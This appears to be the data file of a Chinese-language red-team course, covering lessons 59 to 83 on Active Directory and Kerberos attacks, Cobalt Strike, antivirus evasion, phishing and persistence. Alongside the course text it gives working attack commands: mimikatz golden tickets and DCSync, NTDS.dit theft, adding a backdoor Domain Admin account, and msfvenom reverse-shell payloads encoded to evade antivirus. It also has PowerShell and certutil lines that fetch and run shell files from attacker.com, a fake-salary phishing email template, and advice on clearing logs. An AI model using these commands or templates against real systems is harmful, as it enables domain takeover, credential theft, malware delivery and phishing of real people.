days[59].codeExamples = [{ title: 'AD信息收集命令', language: 'bash', code: '# 查询域信息\nnet config workstation\nnet domain\nnltest /dclist:domain.com\n\n# 查询域控制器\nnslookup -type=SRV _ldap._tcp.domain.com\n\n# 查询用户\nnet user /domain\nnet user username /domain\n\n# 查询组\nnet group /domain\nnet group \"Domain Admins\" /domain\n\n# 查询计算机\nnet computer /domain\n\n# 查询OU\ndsquery ou\n\n# 查询GPO\ngpresult /r\ngpresult /h report.html\n\n# BloodHound收集\nSharpHound.exe -c All\nBloodHound.exe', explanation: 'AD信息收集常用命令' }];

days[60].title = 'Kerberos协议与攻击';
days[60].subtitle = 'Kerberos Protocol and Attacks';
days[60].objectives = ['理解Kerberos协议', '掌握Kerberos攻击', '学会票据操作'];
days[60].content = `Kerberos是Windows域环境的认证协议。

【Kerberos协议原理】
• 客户端向KDC请求TGT
• KDC颁发TGT给客户端
• 客户端用TGT请求ST
• KDC颁发ST给客户端
• 客户端用ST访问服务

【Kerberos攻击方法】
• AS-REP Roasting：利用不需要预认证的用户
• Kerberoasting：利用服务账户
• Golden Ticket：伪造TGT
• Silver Ticket：伪造ST
• Pass-the-Ticket：传递票据

【AS-REP Roasting】
• 原理：利用不需要预认证的用户获取哈希
• 方法：使用Rubeus或Impacket
• 工具：Rubeus.exe、GetNPUsers.py

【Kerberoasting】
• 原理：利用服务账户获取哈希
• 方法：使用Rubeus或Impacket
• 工具：Rubeus.exe、GetUserSPNs.py

【实战技巧】
• 先识别可被攻击的用户
• 再执行攻击
• 注意操作隐蔽性

Kerberos攻击是域渗透的核心技术！`;
days[60].keyPoints = ['Kerberos原理', 'AS-REP Roasting', 'Kerberoasting', '票据攻击'];
days[60].codeExamples = [{ title: 'Kerberos攻击命令', language: 'bash', code: '# AS-REP Roasting\nRubeus.exe asreproast\nGetNPUsers.py domain.com/ -dc-ip dc_ip -no-pass\n\n# Kerberoasting\nRubeus.exe kerberoast\nGetUserSPNs.py domain.com/user:password -dc-ip dc_ip -request\n\n# Golden Ticket\nmimikatz.exe \"kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:hash /user:administrator /ptt\" exit\n\n# Silver Ticket\nmimikatz.exe \"kerberos::silver /domain:domain.com /sid:S-1-5-21-xxx /target:server.domain.com /service:cifs /rc4:hash /user:administrator /ptt\" exit\n\n# Pass-the-Ticket\nmimikatz.exe \"kerberos::ptt ticket.kirbi\" exit\n\n# Rubeus票据操作\nRubeus.exe triage\nRubeus.exe harvest\nRubeus.exe ptt /ticket:ticket.kirbi', explanation: 'Kerberos攻击常用命令' }];

days[61].title = '域渗透常用攻击';
days[61].subtitle = 'Domain Penetration Attacks';
days[61].objectives = ['掌握域渗透方法', '学会域控攻击', '了解权限维持'];
days[61].content = `域渗透是内网渗透的最高阶段。

【域渗透方法】
• 域用户枚举：枚举域内用户
• 域组枚举：枚举域内组
• 域计算机枚举：枚举域内计算机
• 域信任关系：分析域信任关系
• 域控攻击：攻击域控制器

【域控攻击】
• 黄金票据：获取域控权限
• DCSync：获取域内所有用户哈希
• NTDS.dit：导出域数据库
• 域管权限：获取域管理员权限

【域信任关系攻击】
• 横向信任：利用域信任关系渗透
• 父子域信任：利用父子域关系渗透
• 外部信任：利用外部域信任渗透

【权限维持】
• 创建域后门账户
• 修改域组策略
• 创建持久化后门
• 建立隐蔽通道

【实战技巧】
• 先收集域信息
• 识别关键目标
• 选择合适的攻击方法

域渗透是红队实战的最高境界！`;
days[61].keyPoints = ['域渗透方法', '域控攻击', '信任关系攻击', '权限维持'];
days[61].codeExamples = [{ title: '域渗透命令', language: 'bash', code: '# DCSync获取哈希\nmimikatz.exe \"privilege::debug\" \"lsadump::dcsync /domain:domain.com /user:krbtgt\" exit\n\n# 导出NTDS.dit\nvssadmin create shadow /for=C:\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit .\n\n# 枚举域用户\nnet user /domain\ndquery user\n\n# 枚举域组\nnet group /domain\ndquery group\n\n# 枚举域计算机\nnet computer /domain\ndquery computer\n\n# 查询域信任关系\nnltest /domain_trusts\nGet-ADTrust -Filter *\n\n# 添加域后门账户\nnet user backdoor password /add /domain\nnet group \"Domain Admins\" backdoor /add /domain', explanation: '域渗透常用命令' }];

days[62].title = '域渗透高级篇总复习';
days[62].subtitle = 'Domain Penetration Review';
days[62].objectives = ['回顾域渗透知识', '完成综合测试', '准备大神篇学习'];
days[62].content = `高级篇学习结束，全面复习域渗透内容。

【高级篇知识点回顾】
• MSF框架使用
• Meterpreter后渗透
• Windows和Linux提权
• 内网信息收集
• 横向移动技术
• 域渗透技术

【综合测试】
1. MSF框架的模块有哪些？
2. Windows提权的常见方法有哪些？
3. 哈希传递的原理是什么？
4. Kerberos攻击有哪些方法？
5. 域渗透的常用方法有哪些？

【实操练习】
• 在域环境靶场中练习域渗透
• 完成从外网到域控的完整攻击链

高级篇是红队实战的核心，一定要牢固掌握！`;
days[62].keyPoints = ['知识回顾', '综合测试', '实操练习'];

days[63].title = '大神篇总览';
days[63].subtitle = 'Expert Level Overview';
days[63].objectives = ['了解大神篇内容', '建立学习目标', '准备CS学习'];
days[63].content = `大神篇带你深入学习Cobalt Strike、免杀技术、社会工程学和红队作战流程。

【大神篇内容】
• Day64-67：Cobalt Strike（基础、进阶、高级、总结）
• Day68-72：免杀技术（基础、入门、进阶、高级、总结）
• Day73-76：社会工程学（基础、钓鱼邮件、高级钓鱼、总结）
• Day77-82：红队作战（护网详解、作战流程、基础设施、工具链、权限维持、报告撰写）
• Day83：大神篇全书总复习

【学习目标】
• 掌握Cobalt Strike使用
• 掌握免杀技术
• 掌握社会工程学攻击方法
• 了解红队作战流程

【学习建议】
• 多动手实践
• 理解原理而非死记硬背
• 记录实战笔记

大神篇是成为红队高手的必经之路！`;
days[63].keyPoints = ['大神篇内容', '学习目标', '学习建议'];

days[64].title = 'CS基础';
days[64].subtitle = 'Cobalt Strike Basics';
days[64].objectives = ['理解Cobalt Strike概念', '掌握CS基础操作', '学会Beacon配置'];
days[64].content = `Cobalt Strike是红队最强大的作战平台。

【Cobalt Strike概念】
• 定义：红队作战平台，用于模拟高级持续性威胁（APT）
• 功能：Beacon管理、会话管理、横向移动、权限维持
• 组成：Team Server、Client、Beacon

【CS基础操作】
• 启动Team Server：./teamserver <IP> <Password>
• 连接Team Server：启动CS客户端
• 创建Listener：配置C2服务器
• 生成Payload：生成恶意软件
• 管理会话：管理Beacon会话

【Beacon配置】
• HTTP Beacon：通过HTTP协议通信
• HTTPS Beacon：通过HTTPS协议通信
• DNS Beacon：通过DNS协议通信
• SMB Beacon：通过SMB协议通信
• TCP Beacon：通过TCP协议通信

【CS常用命令】
• help：帮助信息
• sysinfo：系统信息
• ifconfig：网络信息
• ps：进程列表
• ls：列出文件
• cd：切换目录

Cobalt Strike是红队必备的核心工具！`;
days[64].keyPoints = ['CS概念', '基础操作', 'Beacon配置', '常用命令'];
days[64].codeExamples = [{ title: 'Cobalt Strike基础操作', language: 'bash', code: '# 启动Team Server\n./teamserver 10.0.0.1 MyPassword123\n\n# 生成Payload\n# 在CS客户端中：\n# 1. 打开Listeners，创建Listener\n# 2. 选择Beacon类型（HTTP/HTTPS/DNS/SMB/TCP）\n# 3. 设置Host和Port\n# 4. 生成Payload\n\n# Beacon常用命令\nhelp\nsysinfo\nifconfig\nps\nls\ncd /home\ncat /etc/passwd\nupload /root/tool.exe\ndownload /etc/shadow\n\n# 进程迁移\nmigrate <pid>\n\n# 提权\ngetsystem\n\n# 横向移动\npsexec_psh <target_ip> <listener>\nwinrm <target_ip> <listener>\n\n# 信息收集\nrun winpeas\nrun seatbelt\n\n# 权限维持\npersistence', explanation: 'Cobalt Strike基础操作' }];

days[65].title = 'CS进阶';
days[65].subtitle = 'Cobalt Strike Advanced';
days[65].objectives = ['掌握CS高级功能', '学会横向移动', '了解权限维持'];
days[65].content = `Cobalt Strike进阶：横向移动和权限维持。

【CS高级功能】
• 横向移动：SMB、RDP、WinRM、SSH
• 权限维持：持久化后门、服务安装、注册表修改
• 凭证窃取：Mimikatz集成、哈希获取
• 内网扫描：端口扫描、服务识别
• 代理转发：SOCKS代理、端口转发

【横向移动方法】
• psexec_psh：利用PsExec进行横向移动
• winrm：利用WinRM进行横向移动
• smb_exec：利用SMB进行横向移动
• rdp：利用RDP进行横向移动
• ssh：利用SSH进行横向移动

【权限维持方法】
• persistence：创建持久化后门
• elevate：权限提升
• install_service：安装服务
• reg：修改注册表
• schedule_task：创建计划任务

【凭证窃取】
• mimikatz：获取登录密码哈希
• hashdump：导出哈希
• kerberos：Kerberos票据操作

【实战技巧】
• 先收集信息
• 再进行横向移动
• 注意操作隐蔽性

Cobalt Strike是红队作战的核心平台！`;
days[65].keyPoints = ['高级功能', '横向移动', '权限维持', '凭证窃取'];

days[66].title = 'CS高级与流量隐匿';
days[66].subtitle = 'Cobalt Strike Advanced and Traffic Concealment';
days[66].objectives = ['掌握CS流量隐匿', '学会C2配置', '了解高级技巧'];
days[66].content = `Cobalt Strike高级：流量隐匿和C2配置。

【流量隐匿】
• 原理：隐藏Beacon通信流量
• 方法：修改User-Agent、添加延迟、随机化通信
• 工具：Cobalt Strike Profile

【C2配置】
• 设置通信间隔：设置Beacon通信时间间隔
• 设置Jitter：设置通信时间抖动
• 设置MaxDNS：设置DNS查询最大次数
• 设置Sleep：设置休眠时间

【Profile配置】
• 修改HTTP头：自定义User-Agent、Accept、Referer
• 修改DNS查询：自定义DNS查询格式
• 添加混淆：混淆Beacon流量
• 添加证书：使用HTTPS证书

【高级技巧】
• 域前置：利用合法域名隐藏C2通信
• CDN转发：利用CDN隐藏C2服务器
• 代理链：通过代理服务器通信
• 多层跳转：通过多个服务器跳转

【实战技巧】
• 先测试流量特征
• 再进行流量隐匿
• 注意操作隐蔽性

流量隐匿是红队作战的关键技术！`;
days[66].keyPoints = ['流量隐匿', 'C2配置', 'Profile配置', '高级技巧'];
days[66].codeExamples = [{ title: 'Cobalt Strike Profile示例', language: 'xml', code: '<profile>\n    <sleep>5000</sleep>\n    <jitter>0.1</jitter>\n    <http>\n        <header>\n            <User-Agent>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36</User-Agent>\n            <Accept>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</Accept>\n            <Accept-Language>zh-CN,zh;q=0.9,en;q=0.8</Accept>\n            <Accept-Encoding>gzip, deflate, br</Accept-Encoding>\n            <Connection>keep-alive</Connection>\n        </header>\n        <uri>\n            <host>legitimate-domain.com</host>\n            <uri>/images/logo.png</uri>\n        </uri>\n        <server>\n            <response>\n                <code>200</code>\n                <type>image/png</type>\n            </response>\n        </server>\n    </http>\n</profile>', explanation: 'Cobalt Strike Profile配置示例' }];

days[67].title = 'CS模块总结';
days[67].subtitle = 'Cobalt Strike Module Summary';
days[67].objectives = ['回顾CS知识', '完成模块测试', '准备免杀学习'];
days[67].content = `Cobalt Strike模块学习结束，检验学习成果。

【CS知识点回顾】
• Cobalt Strike概念和结构
• CS基础操作
• Beacon配置
• 横向移动方法
• 权限维持方法
• 流量隐匿

【模块测试】
1. Cobalt Strike的组成部分有哪些？
2. Beacon有哪些类型？各自的特点是什么？
3. CS的横向移动方法有哪些？
4. CS的权限维持方法有哪些？
5. 如何进行流量隐匿？

【实操练习】
• 在靶场环境中练习CS使用
• 练习横向移动和权限维持

Cobalt Strike是红队作战的核心平台！`;
days[67].keyPoints = ['知识回顾', '模块测试', '实操练习'];

days[68].title = '免杀基础';
days[68].subtitle = 'Anti-Virus Evasion Basics';
days[68].objectives = ['理解免杀原理', '掌握免杀方法', '学会基础免杀技术'];
days[68].content = `免杀是红队作战的必备技能。

【免杀原理】
• 绕过杀毒软件检测
• 本质：修改恶意软件特征
• 目标：让恶意软件不被杀毒软件识别

【免杀分类】
• 静态免杀：修改文件特征
• 动态免杀：修改运行时行为
• 行为免杀：修改执行行为

【基础免杀方法】
• 编码：使用编码器编码Payload
• 加壳：使用加壳工具加壳
• 混淆：混淆代码逻辑
• 反编译：修改源代码后重新编译

【免杀工具】
• msfvenom：生成编码后的Payload
• Veil：免杀Payload生成工具
• TheFatRat：免杀工具
• Shellter：PE文件免杀工具

【实战步骤】
1. 生成Payload
2. 编码Payload
3. 测试免杀效果
4. 调整免杀方法
5. 再次测试

免杀是红队作战的关键技术！`;
days[68].keyPoints = ['免杀原理', '免杀分类', '基础方法', '免杀工具'];
days[68].codeExamples = [{ title: '基础免杀命令', language: 'bash', code: '# msfvenom编码Payload\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > encoded_shell.exe\n\n# 使用多种编码器\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f raw | msfvenom -e x86/call4_dword_xor -i 5 -f exe > double_encoded.exe\n\n# 设置坏字符\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -b \"\\x00\\x0a\\x0d\" -e x86/shikata_ga_nai -i 10 -f exe > badchar_shell.exe\n\n# 使用Veil生成免杀Payload\nveil\nuse evasion/powershell/meterpreter/rev_tcp\nset LHOST 10.0.0.1\nset LPORT 4444\ngenerate\n\n# 使用TheFatRat\nthefatrat\n# 选择Payload类型和免杀选项', explanation: '基础免杀命令' }];

days[69].title = '免杀技术基础篇';
days[69].subtitle = 'Anti-Virus Evasion Basic';
days[69].objectives = ['掌握编码免杀', '学会加壳免杀', '了解混淆免杀'];
days[69].content = `免杀技术基础：编码、加壳和混淆。

【编码免杀】
• 原理：使用编码器修改Payload特征
• 方法：使用msfvenom的-e参数
• 常用编码器：shikata_ga_nai、call4_dword_xor、unicode_upper

【加壳免杀】
• 原理：使用加壳工具修改PE文件结构
• 方法：使用加壳工具对Payload加壳
• 常用加壳工具：UPX、ASPack、VMProtect

【混淆免杀】
• 原理：混淆代码逻辑，使杀毒软件无法识别
• 方法：修改变量名、添加无用代码、混淆控制流
• 工具：ConfuserEx、Dotfuscator

【多态免杀】
• 原理：每次生成的Payload都不同
• 方法：使用多态引擎生成Payload
• 工具：Veil、TheFatRat

【实战技巧】
• 先用简单方法测试
• 再尝试复杂方法
• 多次测试免杀效果

免杀技术需要不断尝试和积累！`;
days[69].keyPoints = ['编码免杀', '加壳免杀', '混淆免杀', '多态免杀'];

days[70].title = '免杀技术进阶篇';
days[70].subtitle = 'Anti-Virus Evasion Advanced';
days[70].objectives = ['掌握内存加载', '学会无文件攻击', '了解进程注入'];
days[70].content = `免杀技术进阶：内存加载和无文件攻击。

【内存加载】
• 原理：将Payload加载到内存中执行，不落地到磁盘
• 方法：使用PowerShell、C#、Python进行内存加载
• 工具：PowerShell Empire、Cobalt Strike

【无文件攻击】
• 原理：不在目标磁盘上写入恶意文件
• 方法：通过网络下载到内存、利用合法工具执行
• 技术：PowerShell脚本、WMI命令、Office宏

【进程注入】
• 原理：将Payload注入到合法进程中执行
• 方法：使用Process Injection、Reflective DLL Injection
• 工具：Cobalt Strike、Metasploit

【反射型DLL注入】
• 原理：将DLL反射加载到内存中
• 方法：使用Reflective DLL技术
• 工具：Cobalt Strike、Veil

【实战技巧】
• 优先使用无文件攻击
• 选择合法进程进行注入
• 注意操作隐蔽性

免杀技术进阶需要深入理解Windows内存机制！`;
days[70].keyPoints = ['内存加载', '无文件攻击', '进程注入', '反射型DLL'];
days[70].codeExamples = [{ title: 'PowerShell内存加载', language: 'powershell', code: '# PowerShell内存加载Payload\npowershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString(\'http://attacker.com/shell.ps1\')\"\n\n# 编码执行\npowershell.exe -exec bypass -encodedcommand <base64_encoded_script>\n\n# 使用Invoke-Expression\npowershell.exe -exec bypass -c \"Invoke-Expression (Get-Content -Path \\\"http://attacker.com/shell.ps1\\\" -Raw)\"\n\n# 使用wget\npowershell.exe -exec bypass -c \"wget http://attacker.com/shell.exe -OutFile C:\\temp\\shell.exe; C:\\temp\\shell.exe\"\n\n# 使用certutil\ncertutil.exe -urlcache -split -f http://attacker.com/shell.exe C:\\temp\\shell.exe\nC:\\temp\\shell.exe', explanation: 'PowerShell内存加载技巧' }];

days[71].title = '免杀技术高级篇';
days[71].subtitle = 'Anti-Virus Evasion Advanced';
days[71].objectives = ['掌握白名单利用', '学会签名伪造', '了解高级免杀技术'];
days[71].content = `免杀技术高级：白名单利用和签名伪造。

【白名单利用】
• 原理：利用合法软件执行恶意代码
• 方法：使用Microsoft Office、PowerShell、WMI等合法工具
• 工具：LOLBins、GTFOBins

【签名伪造】
• 原理：伪造数字签名，使恶意软件看起来合法
• 方法：使用签名伪造工具
• 工具：SignTool、FakeSign

【高级免杀技术】
• 自定义Shellcode：编写自己的Shellcode
• 自定义Payload：编写自己的Payload
• 反调试：防止被调试分析
• 反沙箱：防止被沙箱检测

【机器学习免杀】
• 原理：利用机器学习模型检测和规避杀毒软件
• 方法：使用机器学习框架训练免杀模型
• 工具：TensorFlow、PyTorch

【实战技巧】
• 深入理解杀毒软件检测机制
• 不断尝试新的免杀方法
• 关注最新的免杀技术

免杀技术是红队的核心竞争力！`;
days[71].keyPoints = ['白名单利用', '签名伪造', '高级技术', '机器学习免杀'];

days[72].title = '免杀模块总结';
days[72].subtitle = 'Anti-Virus Evasion Module Summary';
days[72].objectives = ['回顾免杀知识', '完成模块测试', '准备社工学习'];
days[72].content = `免杀模块学习结束，检验学习成果。

【免杀知识点回顾】
• 免杀原理和分类
• 基础免杀方法（编码、加壳、混淆）
• 进阶免杀方法（内存加载、无文件攻击、进程注入）
• 高级免杀方法（白名单利用、签名伪造）
• 免杀工具（msfvenom、Veil、TheFatRat）

【模块测试】
1. 免杀的原理是什么？
2. 基础免杀方法有哪些？
3. 内存加载的原理是什么？
4. 无文件攻击的方法有哪些？
5. 白名单利用的原理是什么？

【实操练习】
• 生成免杀Payload并测试
• 练习无文件攻击

免杀技术是红队作战的必备技能！`;
days[72].keyPoints = ['知识回顾', '模块测试', '实操练习'];

days[73].title = '社会工程学基础';
days[73].subtitle = 'Social Engineering Basics';
days[73].objectives = ['理解社会工程学概念', '掌握社工攻击方法', '学会社工画像'];
days[73].content = `社会工程学是红队最重要的技能之一。

【社会工程学概念】
• 定义：利用人性弱点获取信息或权限
• 本质：心理操纵
• 目标：获取敏感信息、突破安全防线

【社工攻击方法】
• 钓鱼攻击：通过邮件、短信、电话获取信息
• 冒充攻击：冒充他人身份获取信任
• 诱饵攻击：设置诱饵引诱目标上当
• 尾随攻击：跟随他人进入受限区域

【社工画像】
• 收集目标信息：姓名、职位、兴趣爱好、联系方式
• 分析目标心理：恐惧、贪婪、好奇心、责任感
• 找到切入点：利用目标的弱点和需求

【社工工具】
• OSINT工具：公开情报收集工具
• 钓鱼工具：邮件钓鱼、短信钓鱼工具
• 社工平台：社会工程学平台

【实战技巧】
• 先收集目标信息
• 再制定攻击方案
• 注意细节，建立信任

社会工程学是红队最强大的武器！`;
days[73].keyPoints = ['社工概念', '攻击方法', '社工画像', '实战技巧'];

days[74].title = '钓鱼邮件攻击';
days[74].subtitle = 'Phishing Email Attacks';
days[74].objectives = ['掌握钓鱼邮件设计', '学会钓鱼邮件发送', '了解钓鱼邮件检测'];
days[74].content = `钓鱼邮件是最常用的社工攻击手段。

【钓鱼邮件设计】
• 主题设计：紧急通知、工资变动、系统更新、会议邀请
• 内容设计：权威感、紧迫感、可信度、个性化
• 附件设计：恶意文档、宏病毒、钓鱼链接

【钓鱼邮件类型】
• 假冒邮件：冒充HR、IT部门、领导发送邮件
• 附件邮件：包含恶意附件的邮件
• 链接邮件：包含钓鱼链接的邮件
• 勒索邮件：冒充勒索软件发送邮件

【钓鱼邮件发送】
• 使用SMTP服务器发送
• 使用钓鱼工具发送
• 使用开源邮件服务器发送

【钓鱼邮件检测】
• 邮件头分析：检查发件人IP、SPF、DKIM、DMARC
• 链接分析：检查链接是否为钓鱼链接
• 附件分析：检查附件是否包含恶意代码

【实战技巧】
• 精心设计邮件内容
• 个性化定制邮件
• 测试邮件效果

钓鱼邮件是突破防线的有效手段！`;
days[74].keyPoints = ['邮件设计', '邮件类型', '邮件发送', '邮件检测'];
days[74].codeExamples = [{ title: '钓鱼邮件示例', language: 'html', code: '<!DOCTYPE html>\n<html>\n<head><title>工资调整通知</title></head>\n<body>\n    <h2>工资调整通知</h2>\n    <p>尊敬的员工：</p>\n    <p>根据公司规定，您的工资将进行调整。请点击下方链接查看详细信息：</p>\n    <a href=\"http://attacker.com/fake_login\">查看工资调整详情</a>\n    <p>人力资源部</p>\n    <p>2024年1月1日</p>\n</body>\n</html>', explanation: '钓鱼邮件示例' }];

days[75].title = '高级钓鱼与水坑攻击';
days[75].subtitle = 'Advanced Phishing and Watering Hole Attacks';
days[75].objectives = ['掌握高级钓鱼技术', '学会水坑攻击', '了解鱼叉式钓鱼'];
days[75].content = `高级钓鱼技术：水坑攻击和鱼叉式钓鱼。

【水坑攻击】
• 原理：在目标常访问的网站上植入恶意代码
• 方法：入侵目标常访问的网站，植入恶意代码
• 特点：隐蔽性强，成功率高

【鱼叉式钓鱼】
• 原理：针对特定目标定制钓鱼攻击
• 方法：收集目标信息，定制钓鱼内容
• 特点：针对性强，成功率高

【高级钓鱼技术】
• 克隆网站：克隆目标网站进行钓鱼
• 中间人攻击：拦截通信进行钓鱼
• 会话劫持：劫持用户会话
• 双重认证绕过：绕过双重认证

【防御措施】
• 安全培训：提高员工安全意识
• 邮件过滤：阻止恶意邮件
• 多因素认证：即使密码泄露也无法登录
• 网站监控：监控网站是否被入侵

【实战技巧】
• 深入了解目标
• 定制攻击方案
• 注意操作隐蔽性

高级钓鱼技术需要深入理解目标心理！`;
days[75].keyPoints = ['水坑攻击', '鱼叉式钓鱼', '高级技术', '防御措施'];

days[76].title = '钓鱼模块总结';
days[76].subtitle = 'Phishing Module Summary';
days[76].objectives = ['回顾钓鱼知识', '完成模块测试', '准备护网学习'];
days[76].content = `钓鱼模块学习结束，检验学习成果。

【钓鱼知识点回顾】
• 社会工程学概念和方法
• 钓鱼邮件设计和发送
• 高级钓鱼技术（水坑攻击、鱼叉式钓鱼）
• 钓鱼检测和防御

【模块测试】
1. 社会工程学的原理是什么？
2. 钓鱼邮件的设计要点有哪些？
3. 水坑攻击的原理是什么？
4. 鱼叉式钓鱼的特点是什么？
5. 如何防御钓鱼攻击？

【实操练习】
• 设计钓鱼邮件
• 测试钓鱼效果

钓鱼攻击是红队突破防线的有效手段！`;
days[76].keyPoints = ['知识回顾', '模块测试', '实操练习'];

days[77].title = '护网行动详解';
days[77].subtitle = 'Cyber Defense Operation Details';
days[77].objectives = ['了解护网行动流程', '掌握护网准备工作', '学会护网实战技巧'];
days[77].content = `护网行动是国家网络安全实战演练。

【护网行动流程】
• 战前准备：组建团队、情报收集、武器库准备
• 攻击阶段：漏洞发现、漏洞利用、权限提升、横向移动
• 防守阶段：检测攻击、响应攻击、加固防御
• 战后总结：战绩盘点、经验总结、改进措施

【护网准备工作】
• 团队组建：5-10人团队，分工明确
• 情报收集：目标系统信息、人员信息、网络拓扑
• 武器库准备：漏洞利用工具、Payload、免杀样本
• 基础设施：C2服务器、代理、域名

【护网实战技巧】
• 快速突破：找到突破口后快速推进
• 隐蔽操作：注意操作隐蔽性，避免被发现
• 团队协作：保持团队沟通，配合默契
• 灵活应变：根据实际情况调整策略

【护网注意事项】
• 遵守规则：遵守护网行动规则
• 注意安全：保护自己的基础设施
• 做好记录：详细记录攻击过程
• 及时报告：及时报告发现的问题

护网行动是检验红队能力的最佳舞台！`;
days[77].keyPoints = ['护网流程', '准备工作', '实战技巧', '注意事项'];

days[78].title = '红队作战流程';
days[78].subtitle = 'Red Team Operations Process';
days[78].objectives = ['理解红队作战流程', '掌握作战阶段', '学会作战文档编写'];
days[78].content = `红队作战流程是红队行动的指导框架。

【红队作战流程】
• 侦察阶段：情报收集、目标分析、攻击面评估
• 武器化阶段：漏洞利用开发、Payload生成、免杀处理
• 投递阶段：钓鱼攻击、漏洞利用、社会工程学
• 利用阶段：获取Shell、权限提升、信息收集
• 安装阶段：权限维持、持久化、C2配置
• 动作阶段：横向移动、数据收集、目标达成
• 命令与控制阶段：会话管理、指令下发、数据回传
• 清理阶段：痕迹清理、日志删除、后门移除

【作战阶段详解】
• 侦察阶段：收集目标信息，分析攻击面
• 武器化阶段：开发漏洞利用，生成免杀Payload
• 投递阶段：将Payload投递到目标系统
• 利用阶段：执行Payload，获取权限
• 安装阶段：建立持久化访问
• 动作阶段：执行攻击任务
• 命令与控制阶段：管理攻击会话
• 清理阶段：清理攻击痕迹

【作战文档编写】
• 作战计划：详细的攻击计划
• 攻击报告：攻击过程和结果报告
• 总结报告：经验总结和改进建议

【实战技巧】
• 制定详细计划
• 严格执行流程
• 做好记录和报告

红队作战流程是红队行动的核心！`;
days[78].keyPoints = ['作战流程', '阶段详解', '文档编写', '实战技巧'];

days[79].title = '红队基础设施建设';
days[79].subtitle = 'Red Team Infrastructure';
days[79].objectives = ['掌握C2服务器搭建', '学会域名配置', '了解基础设施安全'];
days[79].content = `红队基础设施是红队行动的基础。

【C2服务器搭建】
• 选择VPS：选择可靠的VPS提供商
• 安装操作系统：Linux或Windows
• 安装C2软件：Cobalt Strike、Metasploit
• 配置防火墙：开放必要端口

【域名配置】
• 注册域名：注册合法域名
• 配置DNS：配置域名解析
• 配置SSL：配置HTTPS证书
• 配置CDN：使用CDN隐藏真实IP

【基础设施安全】
• 隐藏真实IP：使用代理、CDN、VPN
• 加密通信：使用HTTPS、TLS
• 日志清理：定期清理服务器日志
• 备份恢复：定期备份数据

【基础设施监控】
• 监控C2服务器：监控服务器状态
• 监控网络流量：监控网络流量异常
• 监控会话：监控Beacon会话

【实战技巧】
• 使用多个C2服务器
• 使用合法域名
• 注意基础设施安全

红队基础设施是红队行动的生命线！`;
days[79].keyPoints = ['C2服务器', '域名配置', '基础设施安全', '监控'];

days[80].title = '红队工具链与武器化';
days[80].subtitle = 'Red Team Toolchain and Weaponization';
days[80].objectives = ['掌握红队工具链', '学会武器化技术', '了解工具开发'];
days[80].content = `红队工具链是红队作战的武器库。

【红队工具链】
• 信息收集工具：Nmap、Gobuster、FOFA、Shodan
• 漏洞挖掘工具：Burp Suite、sqlmap、Nikto
• 漏洞利用工具：Metasploit、Cobalt Strike、ExploitDB
• 后渗透工具：Mimikatz、PowerUp、WinPEAS
• 横向移动工具：CrackMapExec、PsExec、evil-winrm

【武器化技术】
• Payload生成：msfvenom、Veil、TheFatRat
• 免杀处理：编码、加壳、混淆、内存加载
• 后门开发：编写自定义后门
• 工具集成：将多个工具集成到工作流中

【工具开发】
• Python脚本：编写自动化脚本
• PowerShell脚本：编写PowerShell脚本
• C/C++：编写底层工具
• Go：编写跨平台工具

【工具管理】
• 工具版本管理：使用Git管理工具版本
• 工具更新：定期更新工具
• 工具测试：在测试环境中测试工具
• 工具文档：编写工具使用文档

【实战技巧】
• 选择合适的工具
• 掌握工具使用方法
• 开发自己的工具

红队工具链是红队作战的核心竞争力！`;
days[80].keyPoints = ['工具链', '武器化', '工具开发', '工具管理'];

days[81].title = '权限维持与痕迹清理';
days[81].subtitle = 'Persistence and Cleanup';
days[81].objectives = ['掌握权限维持方法', '学会痕迹清理', '了解持久化技术'];
days[81].content = `权限维持和痕迹清理是红队作战的重要环节。

【权限维持方法】
• 创建后门账户：创建隐蔽的后门账户
• 修改注册表：修改注册表实现持久化
• 创建计划任务：创建计划任务实现持久化
• 修改服务：修改服务实现持久化
• WMI持久化：利用WMI实现持久化

【痕迹清理】
• 清理日志：清理系统日志、应用日志、安全日志
• 删除文件：删除攻击工具和Payload
• 清理注册表：清理攻击留下的注册表项
• 清理网络痕迹：清理网络连接记录

【持久化技术】
• 用户级持久化：创建后门账户、修改启动项
• 系统级持久化：修改服务、修改注册表
• 应用级持久化：修改应用配置、植入恶意插件

【防御检测】
• 检测持久化：检测系统中的持久化后门
• 检测异常：检测系统异常行为
• 检测入侵：检测入侵痕迹

【实战技巧】
• 建立多层持久化
• 定期清理痕迹
• 注意隐蔽性

权限维持和痕迹清理是红队作战的关键环节！`;
days[81].keyPoints = ['权限维持', '痕迹清理', '持久化技术', '防御检测'];

days[82].title = '红队报告撰写';
days[82].subtitle = 'Red Team Report Writing';
days[82].objectives = ['掌握报告结构', '学会报告撰写', '了解报告格式'];
days[82].content = `红队报告是红队行动的重要产出。

【报告结构】
• 报告概述：任务背景、目标、范围
• 执行摘要：攻击结果、关键发现、建议
• 详细报告：攻击过程、技术细节、漏洞利用
• 漏洞报告：发现的漏洞列表和详细信息
• 改进建议：安全改进建议
• 附录：工具清单、命令清单、时间线

【报告撰写要点】
• 清晰准确：描述清晰，数据准确
• 客观中立：客观描述攻击过程和结果
• 技术详细：详细描述技术细节
• 建议可行：提出可行的改进建议

【报告格式】
• 标题：清晰的标题
• 章节：合理的章节划分
• 图表：使用图表展示数据
• 附录：提供必要的附录

【报告交付】
• 报告审核：审核报告内容
• 报告交付：向客户交付报告
• 报告解读：向客户解读报告内容
• 后续跟进：跟进改进措施的实施

【实战技巧】
• 及时记录：攻击过程中及时记录
• 整理资料：整理攻击过程中的资料
• 撰写报告：按照报告结构撰写报告

红队报告是红队价值的体现！`;
days[82].keyPoints = ['报告结构', '撰写要点', '报告格式', '报告交付'];

days[83].title = '大神篇全书总复习';
days[83].subtitle = 'Expert Level Review';
days[83].objectives = ['回顾全书知识', '完成综合测试', '准备靶场实战'];
days[83].content = `大神篇学习结束，全面复习全书内容。

